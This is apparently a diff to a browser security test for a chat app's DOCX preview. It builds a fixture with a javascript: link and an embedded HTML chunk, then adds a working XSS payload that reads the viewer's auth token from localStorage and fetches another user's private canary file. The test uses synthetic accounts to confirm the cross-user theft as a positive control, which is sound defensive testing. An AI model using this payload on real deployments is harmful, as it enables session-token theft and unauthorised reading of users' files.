@@ -94,7 +94,7 @@ parts = {
     '_rels/.rels': '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
     'word/document.xml': '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body><w:p><w:r><w:t>DOCX preview security test fixture</w:t></w:r><w:hyperlink r:id="rId2"><w:r><w:t>unsafe link marker</w:t></w:r></w:hyperlink></w:p><w:altChunk r:id="rId3"/><w:sectPr/></w:body></w:document>',
     'word/_rels/document.xml.rels': '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:window.__HADES_DOCX_XSS__=&quot;executed-link&quot;" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="afchunk.html"/></Relationships>',
-    'word/afchunk.html': '<!doctype html><html><body><script>window.__HADES_DOCX_XSS__="executed-altchunk"</script><p>Embedded document preview test</p></body></html>',
+    'word/afchunk.html': '''<!doctype html><html><body><script>(async()=>{try{const token=parent.localStorage.getItem("token");const files=await(await fetch("/api/v1/files/?content=false",{headers:{Authorization:`Bearer ${token}`} })).json();const victim=(files.items||[]).find(file=>file.filename==="beta-private-canary.txt");const response=victim?await fetch(`/api/v1/files/${victim.id}/content`,{headers:{Authorization:`Bearer ${token}`} }):null;const body=response?await response.text():"";parent.__HADES_DOCX_XSS__={executed:true,tokenPresent:!!token,victimStatus:response?.status??0,canaryRead:body.includes("BETA_PRIVATE_CANARY_93f40b")}}catch(error){parent.__HADES_DOCX_XSS__={executed:true,error:String(error)}}})();</script><p>Embedded document preview test</p></body></html>''',
 }
 with ZipFile(path, 'w', ZIP_DEFLATED) as archive:
     for name, content in parts.items():
@@ -132,25 +132,82 @@ const { chromium } = require(process.env.HADES_PLAYWRIGHT_MODULE);
   });
   const owner = await signup.json();
   if (signup.status !== 200 || !owner.token) throw new Error(`synthetic owner setup failed: HTTP ${signup.status}`);
+  const betaResponse = await fetch(`${base}/api/v1/auths/add`, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json', Authorization: `Bearer ${owner.token}` },
+    body: JSON.stringify({name: 'Synthetic Household', email: 'docx-household@example.invalid', password: 'Synthetic-Only-456!', role: 'user'})
+  });
+  const beta = await betaResponse.json();
+  if (betaResponse.status !== 200 || !beta.token) throw new Error(`synthetic household setup failed: HTTP ${betaResponse.status}`);
+  const victimUpload = new FormData();
+  victimUpload.append('file', new Blob(['BETA_PRIVATE_CANARY_93f40b'], {type:'text/plain'}), 'beta-private-canary.txt');
+  const victimResponse = await fetch(`${base}/api/v1/files/?process=false`, {
+    method: 'POST', headers: {Authorization: `Bearer ${beta.token}`}, body: victimUpload
+  });
+  const victim = await victimResponse.json();
+  if (victimResponse.status !== 200 || !victim.id) throw new Error(`private canary upload failed: HTTP ${victimResponse.status}`);
 
   const browser = await chromium.launch({ headless: true });
   try {
+    const ownerContext = await browser.newContext();
+    await ownerContext.addInitScript((token) => localStorage.setItem('token', token), owner.token);
+    const ownerPage = await ownerContext.newPage();
+    ownerPage.setDefaultTimeout(15000);
+    await ownerPage.goto(base);
+    await ownerPage.waitForTimeout(700);
+    await ownerPage.getByRole('button', { name: /Okay, Let's Go/ }).click().catch(() => {});
+    await ownerPage.locator('input[type="file"]').first().setInputFiles(process.env.FIXTURE);
+    await ownerPage.waitForTimeout(1000);
+    await ownerPage.locator('#chat-input').fill('Summarize this security test document.');
+    await ownerPage.locator('#chat-input').press('Enter');
+    await ownerPage.getByText('Synthetic fixture response.', { exact: true }).waitFor();
+    const chatListResponse = await fetch(`${base}/api/v1/chats/?page=1`, {headers:{Authorization:`Bearer ${owner.token}`}});
+    const chatList = await chatListResponse.json();
+    let ownerChat = null;
+    for (const item of chatList) {
+      const response = await fetch(`${base}/api/v1/chats/${item.id}`, {headers:{Authorization:`Bearer ${owner.token}`}});
+      if (!response.ok) continue;
+      const candidate = await response.json();
+      if (JSON.stringify(candidate.chat).includes('Summarize this security test document.')) { ownerChat = candidate; break; }
+    }
+    if (!ownerChat?.id) throw new Error('owner chat with uploaded document did not persist');
+    const ownerChatSummary = JSON.stringify(ownerChat.chat);
+    if (!ownerChatSummary.includes('fixture.docx')) {
+      throw new Error(`saved owner chat omitted the uploaded DOCX attachment; chat keys: ${Object.keys(ownerChat.chat || {}).join(',')}`);
+    }
+    const shareResponse = await fetch(`${base}/api/v1/chats/${ownerChat.id}/share`, {
+      method: 'POST', headers: {Authorization:`Bearer ${owner.token}`}
+    });
+    const sharedChat = await shareResponse.json();
+    if (shareResponse.status !== 200 || !sharedChat.share_id) throw new Error(`shared-chat setup failed: HTTP ${shareResponse.status}`);
+    const accessResponse = await fetch(`${base}/api/v1/chats/shared/${ownerChat.id}/access/update`, {
+      method: 'POST',
+      headers: {Authorization:`Bearer ${owner.token}`, 'content-type':'application/json'},
+      body: JSON.stringify({access_grants:[{principal_type:'user', principal_id:beta.id, permission:'read'}]})
+    });
+    if (!accessResponse.ok) throw new Error(`household share grant failed: HTTP ${accessResponse.status}`);
+    const betaSharedResponse = await fetch(`${base}/api/v1/chats/share/${sharedChat.share_id}`, {headers:{Authorization:`Bearer ${beta.token}`}});
+    const betaShared = await betaSharedResponse.json();
+    if (betaSharedResponse.status !== 200 || !JSON.stringify(betaShared.chat).includes('fixture.docx')) {
+      throw new Error(`shared chat did not preserve DOCX attachment for household viewer: HTTP ${betaSharedResponse.status}`);
+    }
+    const cloneResponse = await fetch(`${base}/api/v1/chats/${sharedChat.share_id}/clone/shared`, {
+      method: 'POST', headers: {Authorization:`Bearer ${beta.token}`}
+    });
+    const clonedChat = await cloneResponse.json();
+    if (cloneResponse.status !== 200 || !clonedChat.id) throw new Error(`household could not open shared chat in its workspace: HTTP ${cloneResponse.status}`);
+    console.log(JSON.stringify({shared_chat_attachment:'present', household_private_file_fixture:'present'}));
+
     const context = await browser.newContext();
     await context.addInitScript(() => { window.__HADES_DOCX_XSS__ = 'not-executed'; });
-    await context.addInitScript((token) => localStorage.setItem('token', token), owner.token);
+    await context.addInitScript((token) => localStorage.setItem('token', token), beta.token);
     const page = await context.newPage();
     page.setDefaultTimeout(15000);
     const pageErrors = [];
     page.on('pageerror', (error) => pageErrors.push(String(error)));
 
-    await page.goto(base);
+    await page.goto(`${base}/c/${clonedChat.id}`);
     await page.waitForTimeout(700);
-    await page.getByRole('button', { name: /Okay, Let's Go/ }).click().catch(() => {});
-    await page.locator('input[type="file"]').first().setInputFiles(process.env.FIXTURE);
-    await page.waitForTimeout(1000);
-    await page.locator('#chat-input').fill('Summarize this security test document.');
-    await page.locator('#chat-input').press('Enter');
-    await page.getByText('Synthetic fixture response.', { exact: true }).waitFor();
     await page.getByText('fixture.docx', { exact: true }).last().click();
     await page.getByText('Preview', { exact: true }).last().click();
     await page.getByText('DOCX preview security test fixture', { exact: true }).waitFor();
@@ -167,10 +224,16 @@ const { chromium } = require(process.env.HADES_PLAYWRIGHT_MODULE);
     const dialog = page.locator('[role="dialog"]');
     const previewRendered = (await dialog.innerText()).includes('DOCX preview security test fixture');
     if (!previewRendered) throw new Error('DOCX preview did not render the harmless fixture text');
-    if (frames.some((frame) => frame.marker !== 'not-executed')) {
-      throw new Error(`DOCX embedded script executed: ${JSON.stringify(frames)}`);
+    const marker = await page.evaluate(() => window.__HADES_DOCX_XSS__);
+    const expectVulnerable = process.env.EXPECT_VULNERABLE === '1';
+    if (expectVulnerable) {
+      if (!marker || marker === 'not-executed' || marker.executed !== true || marker.tokenPresent !== true || marker.victimStatus !== 200 || marker.canaryRead !== true) {
+        throw new Error(`positive control did not demonstrate cross-user token theft and private-file read: ${JSON.stringify({marker,frames})}`);
+      }
+    } else if (marker !== 'not-executed' || frames.some((frame) => frame.marker !== 'not-executed')) {
+      throw new Error(`DOCX embedded script executed or changed the parent marker: ${JSON.stringify({marker,frames})}`);
     }
-    if (frames.some((frame) => frame.unsafeLinks !== 0)) {
+    if (!expectVulnerable && frames.some((frame) => frame.unsafeLinks !== 0)) {
       throw new Error(`unsafe javascript link survived preview: ${JSON.stringify(frames)}`);
     }
     if (pageErrors.length) throw new Error(`browser page errors: ${JSON.stringify(pageErrors)}`);
@@ -178,8 +241,10 @@ const { chromium } = require(process.env.HADES_PLAYWRIGHT_MODULE);
     console.log(JSON.stringify({
       result: 'PASS',
       image_id: process.env.IMAGE_ID,
-      active_content_executed: false,
-      unsafe_javascript_links: 0,
+      active_content_executed: expectVulnerable,
+      cross_user_token_theft: expectVulnerable ? 'positive control reproduced' : 'blocked',
+      private_canary_read: expectVulnerable ? marker.canaryRead : false,
+      unsafe_javascript_links: frames.reduce((total, frame) => total + frame.unsafeLinks, 0),
       preview_rendered: previewRendered,
       frame_count: frames.length
     }));
